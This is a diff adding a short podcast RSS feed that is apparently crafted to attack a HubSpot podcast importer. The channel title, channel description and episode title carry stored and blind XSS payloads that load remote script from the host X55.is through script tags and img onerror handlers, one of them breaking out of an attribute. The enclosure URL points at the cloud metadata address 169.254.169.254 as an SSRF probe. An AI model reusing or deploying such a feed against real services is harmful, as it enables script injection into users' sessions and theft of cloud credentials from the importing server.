@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" 
+    xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" 
+    xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Podcast Test</title><![CDATA[<script src="https://X55.is?1=23781"></script><img src=x onerror=alert(1)>]]></title>
+    <link>https://google.com</link>
+    <language>en-us</language>
+    
+    <description><![CDATA[Testing HubSpot Importer <img src=x onerror='import("//X55.is?1=23781")'>]]></description>
+    
+    <itunes:author>Admin</itunes:author>
+    <itunes:summary>Standard summary for podcast test</itunes:summary>
+
+    <item>
+      <title>Episode 1'"><img src=x onerror='var s=document.createElement("script");s.src="//X55.is?1=23781";document.body.appendChild(s);'></title>
+      
+      <enclosure url="http://169.254.169.254/" length="1024" type="audio/mpeg" />
+      
+      <description>Testing episode description</description>
+      <pubDate>Fri, 13 Feb 2026 00:00:00 GMT</pubDate>
+      <itunes:duration>00:30:00</itunes:duration>
+      <guid isPermaLink="false">unique-id-12345</guid>
+    </item>
+  </channel>
+</rss>
